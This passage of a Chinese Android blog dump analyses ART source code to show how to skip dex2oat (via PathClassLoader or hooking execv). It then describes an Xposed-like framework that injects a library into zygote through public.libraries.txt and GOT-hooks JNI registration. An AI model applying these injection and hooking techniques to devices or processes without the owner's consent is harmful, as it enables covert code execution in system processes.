(sourceName.c_str() == NULL) &#123; return 0; &#125; NullableScopedUtfChars outputName(env, javaOutputName); if (env-&gt;ExceptionCheck()) &#123; return 0; &#125; ClassLinker* linker = Runtime::Current()-&gt;GetClassLinker(); std::unique_ptr&lt;std::vector&lt;const DexFile*&gt;&gt; dex_files(new std::vector&lt;const DexFile*&gt;()); std::vector&lt;std::string&gt; error_msgs; bool success = linker-&gt;OpenDexFilesFromOat(sourceName.c_str(), outputName.c_str(), &amp;error_msgs, dex_files.get()); if (success || !dex_files-&gt;empty()) &#123; // In the case of non-success, we have not found or could not generate the oat file. // But we may still have found a dex file that we can use. return static_cast&lt;jlong&gt;(reinterpret_cast&lt;uintptr_t&gt;(dex_files.release())); &#125; else &#123; // 加载失败的情况，省略 &#125;&#125;这里的注释很有意思，如果返回false（生成oat失败），但是有被成功加载的dex，那么还是应该当做成功。可以看出具体实现在ClassLinker中的OpenDexFilesFromOat里，我们点进去看看：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117// Multidex files make it possible that some, but not all, dex files can be broken/outdated. This// complicates the loading process, as we should not use an iterative loading process, because that// would register the oat file and dex files that come before the broken one. Instead, check all// multidex ahead of time.bool ClassLinker::OpenDexFilesFromOat(const char* dex_location, const char* oat_location, std::vector&lt;std::string&gt;* error_msgs, std::vector&lt;const DexFile*&gt;* dex_files) &#123; // 1) Check whether we have an open oat file. // This requires a dex checksum, use the \"primary\" one. bool needs_registering = false; const OatFile::OatDexFile* oat_dex_file = FindOpenedOatDexFile(oat_location, dex_location, dex_location_checksum_pointer); std::unique_ptr&lt;const OatFile&gt; open_oat_file( oat_dex_file != nullptr ? oat_dex_file-&gt;GetOatFile() : nullptr); // 2) If we do not have an open one, maybe there's one on disk already. // In case the oat file is not open, we play a locking game here so // that if two different processes race to load and register or generate // (or worse, one tries to open a partial generated file) we will be okay. // This is actually common with apps that use DexClassLoader to work // around the dex method reference limit and that have a background // service running in a separate process. ScopedFlock scoped_flock; if (open_oat_file.get() == nullptr) &#123; if (oat_location != nullptr) &#123; std::string error_msg; // We are loading or creating one in the future. Time to set up the file lock. if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); return false; &#125; // TODO Caller specifically asks for this oat_location. We should honor it. Probably? open_oat_file.reset(FindOatFileInOatLocationForDexFile(dex_location, dex_location_checksum, oat_location, &amp;error_msg)); if (open_oat_file.get() == nullptr) &#123; std::string compound_msg = StringPrintf(\"Failed to find dex file '%s' in oat location '%s': %s\", dex_location, oat_location, error_msg.c_str()); VLOG(class_linker) &lt;&lt; compound_msg; error_msgs-&gt;push_back(compound_msg); &#125; &#125; else &#123; // TODO: What to lock here? bool obsolete_file_cleanup_failed; open_oat_file.reset(FindOatFileContainingDexFileFromDexLocation(dex_location, dex_location_checksum_pointer, kRuntimeISA, error_msgs, &amp;obsolete_file_cleanup_failed)); // There's no point in going forward and eventually try to regenerate the // file if we couldn't remove the obsolete one. Mostly likely we will fail // with the same error when trying to write the new file. // TODO: should we maybe do this only when we get permission issues? (i.e. EACCESS). if (obsolete_file_cleanup_failed) &#123; return false; &#125; &#125; needs_registering = true; &#125; // 3) If we have an oat file, check all contained multidex files for our dex_location. // Note: LoadMultiDexFilesFromOatFile will check for nullptr in the first argument. bool success = LoadMultiDexFilesFromOatFile(open_oat_file.get(), dex_location, dex_location_checksum_pointer, false, error_msgs, dex_files); if (success) &#123; // 我们没有有效的oat文件，所以不会走到这里 &#125; else &#123; if (needs_registering) &#123; // We opened it, delete it. open_oat_file.reset(); &#125; else &#123; open_oat_file.release(); // Do not delete open oat files. &#125; &#125; // 4) If it's not the case (either no oat file or mismatches), regenerate and load. // Look in cache location if no oat_location is given. std::string cache_location; if (oat_location == nullptr) &#123; // Use the dalvik cache. const std::string dalvik_cache(GetDalvikCacheOrDie(GetInstructionSetString(kRuntimeISA))); cache_location = GetDalvikCacheFilenameOrDie(dex_location, dalvik_cache.c_str()); oat_location = cache_location.c_str(); &#125; bool has_flock = true; // Definitely need to lock now. if (!scoped_flock.HasFile()) &#123; std::string error_msg; if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); has_flock = false; &#125; &#125; if (Runtime::Current()-&gt;IsDex2OatEnabled() &amp;&amp; has_flock &amp;&amp; scoped_flock.HasFile()) &#123; // Create the oat file. open_oat_file.reset(CreateOatFileForDexLocation(dex_location, scoped_flock.GetFile()-&gt;Fd(), oat_location, error_msgs)); &#125; // Failed, bail. if (open_oat_file.get() == nullptr) &#123; // 如果无法生成oat，那么直接加载dex std::string error_msg; // dex2oat was disabled or crashed. Add the dex file in the list of dex_files to make progress. DexFile::Open(dex_location, dex_location, &amp;error_msg, dex_files); error_msgs-&gt;push_back(error_msg); return false; &#125; // 再次尝试加载oat，无关，省略&#125;这个函数比较长，所以做了一点精简。我们在这里看到了一点端倪，这个函数做了这些事情：检查我们是否已经有一个打开了的oat如果没有，那么检查oat缓存目录（创建DexClassLoader时传入的第二个参数）是否已经有了一个oat，并且检查这个oat的有效性如果没有或者这个oat是无效的，那么生成一个oat文件我们首次加载dex时，肯定没有有效的oat，最后会生成一个新的oat：12345if (Runtime::Current()-&gt;IsDex2OatEnabled() &amp;&amp; has_flock &amp;&amp; scoped_flock.HasFile()) &#123; // Create the oat file. open_oat_file.reset(CreateOatFileForDexLocation(dex_location, scoped_flock.GetFile()-&gt;Fd(), oat_location, error_msgs));&#125;这里有一个if判断，直接决定是否进行dex2oat，我们看看能不能通过各种手段让这个判断不成立。禁用dex2oat第一招：修改Runtime中的变量这个if判断里，第一个条件就是Runtime::Current()-&gt;IsDex2OatEnabled()，如果返回false，那么就不会生成oat。这个函数的实现如下：1234567bool IsDex2OatEnabled() const &#123; return dex2oat_enabled_ &amp;&amp; IsImageDex2OatEnabled();&#125;bool IsImageDex2OatEnabled() const &#123; return image_dex2oat_enabled_;&#125;dex2oat_enabled_与image_dex2oat_enabled_都是Runtime对象中的成员变量，而Runtime可以通过JavaVM获取，所以我们只需要修改这个值就能禁用dex2oat。已经有其他人实现了这一步，具体可以看看这篇博客。然而事情真的会这么简单吗？查看源码发现Runtime是一个炒鸡大的结构体，Android里有什么东西都往这扔，你几乎可以从Runtime对象上直接或间接获取到任何东西，然而也正是因为Runtime太大了，使得没有什么好的办法获取里面的值。让我们看看还有没有其他方法：第二招：使用PathClassLoader我们可以看见，在if判断里，还有两个条件：has_flock和scoped_flock.HasFile()，让我们看看是否可以让这两个条件不成立。has_flock的赋值：123456789bool has_flock = true;// Definitely need to lock now.if (!scoped_flock.HasFile()) &#123; std::string error_msg; if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); has_flock = false; &#125;&#125;又是scoped_flock，看看在上面scoped_flock可能在哪里被初始化：12345678910111213ScopedFlock scoped_flock;if (open_oat_file.get() == nullptr) &#123; if (oat_location != nullptr) &#123; std::string error_msg; // We are loading or creating one in the future. Time to set up the file lock. if (!scoped_flock.Init(oat_location, &amp;error_msg)) &#123; error_msgs-&gt;push_back(error_msg); return false; &#125; // 省略代码 &#125;&#125;看看ScopedFlock的Init方法：12345678910bool ScopedFlock::Init(const char* filename, std::string* error_msg) &#123; while (true) &#123; file_.reset(OS::OpenFileWithFlags(filename, O_CREAT | O_RDWR)); if (file_.get() == NULL) &#123; *error_msg = StringPrintf(\"Failed to open file '%s': %s\", filename, strerror(errno)); return false; &#125; // 省略一大堆代码…… &#125;&#125;可以看见，会打开这个文件，flags为O_CREAT | O_RDWR，那我们只需要设置oat_location为不可写的路径，就能让ScopedFlock::Init返回false。不过我们要注意的是，如果oat_location不为null并且无法使用，那在上面的一个判断里就会直接返回false。怎么办？是时候请出我们的主角PathClassLoader了！PathClassLoader作为DexClassLoader的兄弟（也可能是姐妹？），受到的待遇与DexClassLoader截然不同：网上讲解动态加载dex的文章几乎都只讲DexClassLoader，而对于PathClassLoader则是一笔带过：“PathClassLoader只能加载系统中已经安装过的apk”。然而事实真的是这样吗？或许Android 5.0以前是，但Android 5.0时就已经可以加载外部dex了，今天我要为PathClassLoader正名！让我们来对比一下DexClassLoader和PathClassLoader的源码。DexClassLoader：123456public class DexClassLoader extends BaseDexClassLoader &#123; public DexClassLoader(String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent) &#123; super(dexPath, new File(optimizedDirectory), libraryPath, parent); &#125;&#125;对，你没看错，有效代码就这么点。让我们再看看PathClassLoader的源码：12345678910public class PathClassLoader extends BaseDexClassLoader &#123; public PathClassLoader(String dexPath, ClassLoader parent) &#123; super(dexPath, null, null, parent); &#125; public PathClassLoader(String dexPath, String libraryPath, ClassLoader parent) &#123; super(dexPath, null, libraryPath, parent); &#125;&#125;实际上所以实现代码都在BaseDexClassLoader中，DexClassLoader和PathClassLoader都调用了同一个构造函数：123456789public class BaseDexClassLoader extends ClassLoader &#123; private final DexPathList pathList; public BaseDexClassLoader(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent) &#123; super(parent); this.pathList = new DexPathList(this, dexPath, libraryPath, optimizedDirectory); &#125;&#125;注意第二个参数，optimizedDirectory，DexClassLoader传入的是new File(optimizedDirectory)，而PathClassLoader传入的是null。记住这一点。这两种情况最后都会调用到DexFile.openDexFileNative中1private static native long openDexFileNative(String sourceName, String outputName, int flags);如果是PathClassLoader，outputName为null，会进入这个if分支中：12345678// Look in cache location if no oat_location is given.std::string cache_location;if (oat_location == nullptr) &#123; // Use the dalvik cache. const std::string dalvik_cache(GetDalvikCacheOrDie(GetInstructionSetString(kRuntimeISA))); cache_location = GetDalvikCacheFilenameOrDie(dex_location, dalvik_cache.c_str()); oat_location = cache_location.c_str();&#125;这里会把oat_location设置成/data/dalvik-cache/下的路径，接下来因为我们根本没有对dalvik-cache的写入权限，所以无法打开fd，然后就会走到这里直接加载原始dex：1234567if (open_oat_file.get() == nullptr) &#123; std::string error_msg; // dex2oat was disabled or crashed. Add the dex file in the list of dex_files to make progress. DexFile::Open(dex_location, dex_location, &amp;error_msg, dex_files); error_msgs-&gt;push_back(error_msg); return false;&#125;至此整个逻辑已经明朗，通过PathClassLoader加载会把oat输出路径设置成/data/dalvik-cache/下，然后因为我们没有对dalvik-cache的写入权限，所以无法打开fd，之后会直接加载原始dex，不会进行dex2oat。（注：本文分析源码是Android 5.0，在Android 8.1时源码有改动，就算是DexClassLoader也会把optimizedDirectory设置成null，输出的oat在dex的父目录/oat/下，所以无法通过PathClassLoader快速加载dex，但在8.1时已经有InMemoryDexClassLoader了，直接通过InMemoryDexClassLoader加载就好了。简单做了个小测试，在我的AVD（Android 7.1.1）上，用DexClassLoader加载75M的qq apk用了近80秒，并生成了一个313M的oat，而PathClassLoader用时稳定在2秒左右，emmm……看起来我们已经有一个比较好的办法禁用dex2oat了，不过需要修改源码没法直接全局禁用，修改Runtime风险又太大，让我们看看还有没有其他方法。第三招：hook execv到了这里，上面那个判断肯定会成立了，似乎进行dex2oat已成定局？我们继续看CreateOatFileForDexLocation。1234567891011121314151617181920212223const OatFile* ClassLinker::CreateOatFileForDexLocation(const char* dex_location, int fd, const char* oat_location, std::vector&lt;std::string&gt;* error_msgs) &#123; // Generate the output oat file for the dex file VLOG(class_linker) &lt;&lt; \"Generating oat file \" &lt;&lt; oat_location &lt;&lt; \" for \" &lt;&lt; dex_location; std::string error_msg; if (!GenerateOatFile(dex_location, fd, oat_location, &amp;error_msg)) &#123; CHECK(!error_msg.empty()); error_msgs-&gt;push_back(error_msg); return nullptr; &#125; std::unique_ptr&lt;OatFile&gt; oat_file(OatFile::Open(oat_location, oat_location, nullptr, !Runtime::Current()-&gt;IsCompiler(), &amp;error_msg)); if (oat_file.get() == nullptr) &#123; std::string compound_msg = StringPrintf(\"\\nFailed to open generated oat file '%s': %s\", oat_location, error_msg.c_str()); error_msgs-&gt;push_back(compound_msg); return nullptr; &#125; return oat_file.release();&#125;GenerateOatFile是核心逻辑，这个函数大部分都是我们不关心的配置dex2oat参数就不贴出来了，最后会fork出一个新进程，然后在子进程里执行execv()调用dex2oat。看起来我们必然要执行dex2oat了？别慌，还有办法。虽然没有直接的开关去阻止dex2oat，但我们还有hook大法！生成oat最后是通过execv调用dex2oat进行的，所以我们可以hook掉execv函数，如果是执行dex2oat那么直接让这个进程退出即可！Lody大神的早期作品TurboDex就是这样实现的。不过这个项目其实还可以优化一下：TurboDex是使用的Substrate进行hook，这是一个inline hook库，而execv是来自libc.so的导出符号，其实直接通过GOT Hook就能hook到，没有必要去用inline hook，反而增加crash风险。总结本来我只是为了研究DexClassLoader与PathClassLoader的区别的，网上的文章和实验的结果完全不一样，结果意外发现一个快速加载dex的方法，就写出来了 :)这个故事告诉我们，没事多看源码（手动滑稽）另外个人建议，快速加载dex之后后台可以开一个线程单独进行dex2oat，具体可以参考ArtDexOptimizer，下次启动的时候如果完成了可以直接用生成好的oat文件，毕竟用oat比直接加载dex快得多，而且更稳定~","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"dex","slug":"dex","permalink":"https://blog.canyie.top/tags/dex/"}]},{"title":"试着写了一个类Xposed框架","slug":"a-new-xposed-style-framework","date":"2020-02-03T06:51:21.000Z","updated":"2020-02-05T06:10:23.000Z","comments":true,"path":"2020/02/03/a-new-xposed-style-framework/","link":"","permalink":"https://blog.canyie.top/2020/02/03/a-new-xposed-style-framework/","excerpt":"新人第一次写博客，勿喷..本文也发布在知乎上Xposed框架在Android上是神器般的存在，它给了普通用户随意定制系统的能力，各种骚操作层出不穷。随着咱对Android的了解越来越深（其实一点都不深..），逐渐冒出了自己写一个类Xposed框架的想法，最终搞出了这个勉强能用的半成品。代码在这：Dreamland &amp; Dreamland Manager ，代码写的很辣鸡，求轻喷QAQ接下来会介绍一下实现细节与遇到的问题。","text":"新人第一次写博客，勿喷..本文也发布在知乎上Xposed框架在Android上是神器般的存在，它给了普通用户随意定制系统的能力，各种骚操作层出不穷。随着咱对Android的了解越来越深（其实一点都不深..），逐渐冒出了自己写一个类Xposed框架的想法，最终搞出了这个勉强能用的半成品。代码在这：Dreamland &amp; Dreamland Manager ，代码写的很辣鸡，求轻喷QAQ接下来会介绍一下实现细节与遇到的问题。注入 zygote 进程我们想实现Xposed那样在目标进程加载自己的模块，就必须把我们自己的代码注入到目标进程，而且我们的代码执行的时机还需要足够早，一般来说都是选择直接注入到zygote进程。先来看看其他框架的实现：Xposed ：Xposed for art 重新实现了app_process，libart.so等重要系统库，安装时会替换这些文件，而各大厂商几乎没有不修改它们的，一旦被替换很可能变砖，导致Xposed在非原生系统上的稳定性很差。EdXposed : EdXp依赖 Riru 而Riru是通过替换libmemtrack.so来实现，这个so库会在zygote进程启动时被加载，并且比libart轻得多（只有10个导出函数），然后就可以在zygote进程里执行任意代码。太极阳 : 太极阳通过一种我看不懂的魔法（看了一下只发现libjit.so，但weishu表示Android系统里并没有一个这样一个库，所以并不是简单替换so）注入进zygote（以前是替换libprocessgroup.so）可以看出，其他框架几乎都通过直接替换系统已有的so库实现，而替换已有so库则需要尽量选择较轻的库，以避免厂商的修改导致的问题。然而，我们没法避免厂商在so里加料，如果厂商修改了这个so库，我们直接把我们自己以AOSP为蓝本写的so替换上去，则会导致严重的问题。有没有别的什么办法？下面介绍梦境的实现方式。（注：如无特别说明，本文中的AOSP源码都是 7.0.0_r36 对应的代码）我们知道，在android中，所有的应用进程都是由zygote进程fork出来的，而zygote对应的可执行文件就是app_process（具体可以看init.rc）app_process的main方法如下：12345678910111213141516int main(int argc, char* const argv[])&#123; // 省略无关代码... AppRuntime runtime(argv[0], computeArgBlockSize(argc, argv)); // 省略无关代码... if (zygote) &#123; runtime.start(\"com.android.internal.os.ZygoteInit\", args, zygote); &#125; else if (className) &#123; runtime.start(\"com.android.internal.os.RuntimeInit\", args, zygote); &#125; else &#123; fprintf(stderr, \"Error: no class name or --zygote supplied.\\n\"); app_usage(); LOG_ALWAYS_FATAL(\"app_process: no class name or --zygote supplied.\"); return 10; &#125;&#125;可以发现，是通过AppRuntime启动的，而AppRuntime继承自AndroidRuntime，start方法的实现在AndroidRuntime里1234567891011121314151617181920212223242526272829/* * Start the Android runtime. This involves starting the virtual machine * and calling the \"static void main(String[] args)\" method in the class * named by \"className\". * * Passes the main function two arguments, the class name and the specified * options string. */void AndroidRuntime::start(const char* className, const Vector&lt;String8&gt;&amp; options, bool zygote)&#123; // 省略无关代码... /* start the virtual machine */ JniInvocation jni_invocation; jni_invocation.Init(NULL); JNIEnv* env; if (startVm(&amp;mJavaVM, &amp;env, zygote) != 0) &#123; return; &#125; onVmCreated(env); /* * Register android functions. */ if (startReg(env) &lt; 0) &#123; ALOGE(\"Unable to register all android natives\\n\"); return; &#125; // 省略无关代码...&#125;注意startVm这个方法，我们点进去看看。1234567891011121314151617181920212223242526272829303132/* * Start the Dalvik Virtual Machine. * * Various arguments, most determined by system properties, are passed in. * The \"mOptions\" vector is updated. * * CAUTION: when adding options in here, be careful not to put the * char buffer inside a nested scope. Adding the buffer to the * options using mOptions.add() does not copy the buffer, so if the * buffer goes out of scope the option may be overwritten. It's best * to put the buffer at the top of the function so that it is more * unlikely that someone will surround it in a scope at a later time * and thus introduce a bug. * * Returns 0 on success. */int AndroidRuntime::startVm(JavaVM** pJavaVM, JNIEnv** pEnv, bool zygote)&#123; // 省略无关代码... /* * Initialize the VM. * * The JavaVM* is essentially per-process, and the JNIEnv* is per-thread. * If this call succeeds, the VM is ready, and we can start issuing * JNI calls. */ if (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; 0) &#123; ALOGE(\"JNI_CreateJavaVM failed\\n\"); return -1; &#125; return 0;&#125;接下来看JNI_CreateJavaVM方法：123456789101112131415161718192021222324252627282930313233343536// JNI Invocation interface.extern \"C\" jint JNI_CreateJavaVM(JavaVM** p_vm, JNIEnv** p_env, void* vm_args) &#123; ScopedTrace trace(__FUNCTION__); const JavaVMInitArgs* args = static_cast&lt;JavaVMInitArgs*&gt;(vm_args); if (IsBadJniVersion(args-&gt;version)) &#123; LOG(ERROR) &lt;&lt; \"Bad JNI version passed to CreateJavaVM: \" &lt;&lt; args-&gt;version; return JNI_EVERSION; &#125; RuntimeOptions options; for (int i = 0; i &lt; args-&gt;nOptions; ++i) &#123; JavaVMOption* option = &amp;args-&gt;options[i]; options.push_back(std::make_pair(std::string(option-&gt;optionString), option-&gt;extraInfo)); &#125; bool ignore_unrecognized = args-&gt;ignoreUnrecognized; if (!Runtime::Create(options, ignore_unrecognized)) &#123; return JNI_ERR; &#125; // Initialize native loader. This step makes sure we have // everything set up before we start using JNI. android::InitializeNativeLoader(); Runtime* runtime = Runtime::Current(); bool started = runtime-&gt;Start(); if (!started) &#123; delete Thread::Current()-&gt;GetJniEnv(); delete runtime-&gt;GetJavaVM(); LOG(WARNING) &lt;&lt; \"CreateJavaVM failed\"; return JNI_ERR; &#125; *p_env = Thread::Current()-&gt;GetJniEnv(); *p_vm = runtime-&gt;GetJavaVM(); return JNI_OK;&#125;这个函数不长，我就直接全部贴出来了。注意看android::InitializeNativeLoader()，这个函数直接调用了g_namespaces-&gt;Initialize()，而g_namespaces是一个LibraryNamespaces指针，继续看下去，我们发现了宝藏：123456789101112131415161718192021222324252627282930void Initialize() &#123; std::vector&lt;std::string&gt; sonames; const char* android_root_env = getenv(\"ANDROID_ROOT\"); std::string root_dir = android_root_env != nullptr ? android_root_env : \"/system\"; std::string public_native_libraries_system_config = root_dir + kPublicNativeLibrariesSystemConfigPathFromRoot; LOG_ALWAYS_FATAL_IF(!ReadConfig(public_native_libraries_system_config, &amp;sonames), \"Error reading public native library list from \\\"%s\\\": %s\", public_native_libraries_system_config.c_str(), strerror(errno)); // 省略无关代码 // This file is optional, quietly ignore if the file does not exist. ReadConfig(kPublicNativeLibrariesVendorConfig, &amp;sonames); // android_init_namespaces() expects all the public libraries // to be loaded so that they can be found by soname alone. // // TODO(dimitry): this is a bit misleading since we do not know // if the vendor public library is going to be opened from /vendor/lib // we might as well end up loading them from /system/lib // For now we rely on CTS test to catch things like this but // it should probably be addressed in the future. for (const auto&amp; soname : sonames) &#123; dlopen(soname.c_str(), RTLD_NOW | RTLD_NODELETE); &#125; public_libraries_ = base::Join(sonames, ':');&#125;public_native_libraries_system_config=/system/etc/public.libraries.txt，而ReadConfig方法很简单，读取传进来的文件路径，按行分割，忽略空行和以#开头的行，然后把这行push_back到传进来的vector里。所以这个函数做了这几件事：读取/system/etc/public.libraries.txt和/vendor/etc/public.libraries.txt挨个dlopen这两个txt文件里提到的所有so库注：这里分析的源码是7.0.0的，在7.0往后的所有版本（截至本文发布）你都能找到类似的逻辑。知道了这件事注入zygote就好办多了嘛！只要把我们自己写的so库扔到/system/lib下面（64位是/syste/lib64），然后在/system/etc/public.libraries.txt里把我们自己的文件加上去，这样zygote启动的时候就会去加载我们的so库，然后我们写一个函数，加上__attribute__((constructor))，这样这个函数就会在so库被加载的时候被调用，我们就完成了注入逻辑；而且这个文件是一个txt文件，只需要追加一行文件名就行，即使厂商做了修改也不用担心，稳定性棒棒哒！（注1：此方法是我看一篇博客时看见的，那篇博客吐槽“在public.libraries.txt里加上的so库竟然会在zygote启动时被加载，每次修改都要重启手机才能生效，多不方便调试”，但是他抱怨的特性却成为了我的曙光，可惜找不到那篇博客了，没法贴出来…）（注2：在我大致完成了核心逻辑之后，我在EdXp的源码里发现了这个文件 ；这个部分看起来是使用whale进行java hook的方案，但是我从来没有听说过有使用纯whale进行java hook的EdXp版本，并且我在install.sh中没有看见操作public.libraries.txt，所以不太懂他想用这个文件干什么 :( ）ok，现在我们完成了注入zygote进程的逻辑，刚完成的时候我想，完成了注入部分，ART Hook部分也有很多开源库，那么实现一个xposed不是很简单的事吗？果然我还是太年轻…监控应用进程启动前面我们注入了zygote进程，然而这样还不够，我们还需要监控应用进程启动并在应用进程执行代码才行。刚开始我的想法很简单：直接在zygote里随便用art hook技术hook掉几个java方法；不过在我们的so库被加载的时候Runtime还没启动完成，没法拿到JNIEnv（就算拿到也用不了），这个也好办，native inline hook掉几个会在Runtime初始化完成时调用的函数就行，然并卵，提示无法分配可执行内存。wtf？？为什么分配内存会失败？内存满了？没对齐？最后终于发现这样一条log：type=1400 audit(0.0:5): avc: denied { execmem } for scontext=u:r:zygote:s0 tcontext=u:r:zygote:s0 tclass=process permissive=0上网查了一下，这条log代表zygote进程的context（u:r:zygote:s0）不允许分配可执行的匿名内存。这就麻烦了呀，很多事都做不了了（包括java方法的inline hook），想过很多办法（比如替换sepolicy），最后都被我否决了。那怎么办？最后打算去看EdXp的处理方式，没看见任何有关SELinux的部分，似乎是让magisk处理，不过我的是模拟器，没法装magisk。这个问题困扰了我很久，最后，在Riru的源码里发现了另一种实现方案：通过GOT Hook拦截jniRegisterNativeMethods，然后就可以替换部分关键JNI函数。简单来说，当发生跨ELF的函数调用时，会去.got表里查这个函数的绝对地址，然后再跳转过去，所以我们直接改这个表就能达到hook的目的，更多实现细节可以看xhook的说明文档。这种方式的好处是不需要直接操作内存中的指令，不需要去手动分配可执行内存，所以不会受到SELinux的限制；缺点也很明显，如果人家不查.got表，就无法hook了。所以这种方式一般用于hook系统函数，比如来自libc的malloc, open等函数。好了，GOT Hook并不是重点，接下来Riru使用xhook hook了libandroid_runtime.so对jniRegisterNativeMethods方法（来自libnativehelper.so）的调用，这样就能拦截一部分的JNI方法调用了。为什么说是一部分？因为另一部分JNI函数的实现在libart里，这一部分函数直接通过env-&gt;RegisterNativeMethods完成注册，所以无法hook。之后riru在被替换的jniRegisterNativeMethods中动了一点小手脚：如果正在注册来自Zygote类的JNI方法，那么会把nativeForkSystemServer和nativeForkAndSpecialize替换成自己的实现，这样就能拦截system_server与应用进程的启动了！Riru的这个方案非常好，但是还有优化空间：nativeForkAndSpecialize这个函数基本上每个版本都会变签名，而且各个厂商也会做修改，Riru的办法很简单：比对签名，如果签名不对那么就不会替换。不过，实际上我们并不需要那么精密的监控进程启动，让我们来找一下有没有其他的hook点。大家都知道的，zygote进程最终会进入ZygoteInit.main，在main方法里fork出system_server，然后进入死循环接收来自AMS的请求fork出新进程。12345678910public static void main(String argv[]) &#123; // 省略无关代码... if (startSystemServer) &#123; startSystemServer(abiList, socketName); &#125; // 省略无关代码... Log.i(TAG, \"Accepting command socket connections\"); runSelectLoop(abiList); // 省略无关代码...&#125;在startSystemServer里会fork出system_server，runSelectLoop中会进入死循环等待创建进程请求，然后fork出应用进程。12345678910111213141516171819202122/** * Prepare the arguments and fork for the system server process. */private static boolean startSystemServer(String abiList, String socketName) throws MethodAndArgsCaller, RuntimeException &#123; // 省略无关代码... /* Request to fork the system server process */ pid = Zygote.forkSystemServer( parsedArgs.uid, parsedArgs.gid, parsedArgs.gids, parsedArgs.debugFlags, null, parsedArgs.permittedCapabilities, parsedArgs.effectiveCapabilities); /* For child process */ if (pid == 0) &#123; // 注：返回0代表子进程 if (hasSecondZygote(abiList)) &#123; waitForSecondaryZygote(socketName); &#125; handleSystemServerProcess(parsedArgs); &#125;&#125;点进去handleSystemServerProcess里看看：12345678910111213141516171819202122/** * Finish remaining work for the newly forked system server process. */ private static void handleSystemServerProcess( ZygoteConnection.Arguments parsedArgs) throws ZygoteInit.MethodAndArgsCaller &#123; // 省略无关代码... if (parsedArgs.invokeWith != null) &#123; // 走不进去，省略 &#125; else &#123; ClassLoader cl = null; if (systemServerClasspath != null) &#123; cl = createSystemServerClassLoader(systemServerClasspath, parsedArgs.targetSdkVersion); Thread.currentThread().setContextClassLoader(cl); &#125; /* * Pass the remaining arguments to SystemServer. */ RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion, parsedArgs.remainingArgs, cl); &#125; &#125;最终会进入RuntimeInit.zygoteInit（7.x，对于8.x与以上在ZygoteInit.zygoteInit），记住这一点然后，应用进程的创建是在runSelectLoop()里，最后会通过ZygoteConnection.runOnce进行处理12345678910111213141516171819202122232425262728293031323334/** * Reads one start command from the command socket. If successful, * a child is forked and a &#123;@link ZygoteInit.MethodAndArgsCaller&#125; * exception is thrown in that child while in the parent process, * the method returns normally. On failure, the child is not * spawned and messages are printed to the log and stderr. Returns * a boolean status value indicating whether an end-of-file on the command * socket has been encountered. * * @return false if command socket should continue to be read from, or * true if an end-of-file has been encountered. * @throws ZygoteInit.MethodAndArgsCaller trampoline to invoke main() * method in child process */boolean runOnce() throws ZygoteInit.MethodAndArgsCaller &#123; //忽略无关代码 pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids, parsedArgs.debugFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo, parsedArgs.niceName, fdsToClose, parsedArgs.instructionSet, parsedArgs.appDataDir); // 忽略无关代码 if (pid == 0) &#123; // 子进程 // in child IoUtils.closeQuietly(serverPipeFd); serverPipeFd = null; handleChildProc(parsedArgs, descriptors, childPipeFd, newStderr); // should never get here, the child is expected to either // throw ZygoteInit.MethodAndArgsCaller or exec(). return true; &#125; else &#123; // 忽略 &#125;&#125;12345678910111213141516171819202122232425/** * Handles post-fork setup of child proc, closing sockets as appropriate, * reopen stdio as appropriate, and ultimately throwing MethodAndArgsCaller * if successful or returning if failed. * * @param parsedArgs non-null; zygote args * @param descriptors null-ok; new file descriptors for stdio if available. * @param pipeFd null-ok; pipe for communication back to Zygote. * @param newStderr null-ok; stream to use for stderr until stdio * is reopened. * * @throws ZygoteInit.MethodAndArgsCaller on success to * trampoline to code that invokes static main. */private void handleChildProc(Arguments parsedArgs, FileDescriptor[] descriptors, FileDescriptor pipeFd, PrintStream newStderr) throws ZygoteInit.MethodAndArgsCaller &#123; // 忽略无关代码 if (parsedArgs.invokeWith != null) &#123; // 走不进去，省略 &#125; else &#123; RuntimeInit.zygoteInit(parsedArgs.targetSdkVersion, parsedArgs.remainingArgs, null /* classLoader */); &#125;&#125;最后也是通过RuntimeInit.zygoteInit（7.x，对于8.x与以上在ZygoteInit.zygoteInit）完成。点进去看看有没有hook点：123456789101112131415161718192021222324/** * The main function called when started through the zygote process. This * could be unified with main(), if the native code in nativeFinishInit() * were rationalized with Zygote startup.&lt;p&gt; * * Current recognized args: * &lt;ul&gt; * &lt;li&gt; &lt;code&gt; [--] &amp;lt;start class name&amp;gt; &amp;lt;args&amp;gt; * &lt;/ul&gt; * * @param targetSdkVersion target SDK version * @param argv arg strings */public static final void zygoteInit(int targetSdkVersion, String[] argv, ClassLoader classLoader) throws ZygoteInit.MethodAndArgsCaller &#123; if (DEBUG) Slog.d(TAG, \"RuntimeInit: Starting application from zygote\"); Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, \"RuntimeInit\"); redirectLogStreams(); commonInit(); nativeZygoteInit(); applicationInit(targetSdkVersion, argv, classLoader);&#125;注意到那个nativeZygoteInit没有！！很明显是个native方法，而且是我们可以hook到的native方法！！这样子我们就可以直接在jniRegisterNativeMethods里替换掉这个方法了！而且这个方法从7.0到10.0也只有过一次改变：从RuntimeInit搬到ZygoteInit，比nativeForkAndSpecialize稳得多。（然而现在看来某些操作还是需要比较精细的监控的，以后再改吧）加载Xposed模块这一部分其实是最简单的，目前已经有很多开源的ART Hook库，拿来就能用，需要自己写的地方也不需要跟太久的系统函数调用。目前是选择了SandHook作为核心ART Hook库，主要是已经提供好了Xposed 